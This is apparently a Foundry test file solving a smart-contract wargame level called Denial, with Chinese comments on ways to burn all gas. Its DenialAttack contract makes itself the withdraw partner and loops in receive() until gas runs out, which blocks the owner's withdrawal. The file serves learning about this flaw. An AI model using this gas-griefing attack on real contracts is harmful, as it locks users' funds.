// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Denial} from "../src/Denial.sol";

/* 
call 发送不会中断程序 所以即使 receive进行 revert也不会影响下一句代码的执行
需要将后面的代码gas消耗掉
1 无限循环
while (true) {}
2 0.8以下版本
assert(false)
0.8版本不会消耗所有gas 可以使用 assembly实现相同的效果
assembly {
    invalid()
}
*/

contract DenialAttack {
    uint256 private sum;

    constructor(Denial _dnl) {
        Denial dnl = Denial(_dnl);
        dnl.setWithdrawPartner(address(this));
    }

    receive() external payable {
        uint256 index;
        for (index = 0; index < type(uint256).max; index++) {
            sum += 1;
        }
    }
}

contract DenialTest is Test {
    Denial public denial;
    DenialAttack public denialAttack;

    address alice = address(1);

    function setUp() public {
        denial = new Denial();
        deal(address(denial), 10 ether);

        denialAttack = new DenialAttack(denial);
    }

    function testAttack() public {
        denial.withdraw();
    }
}
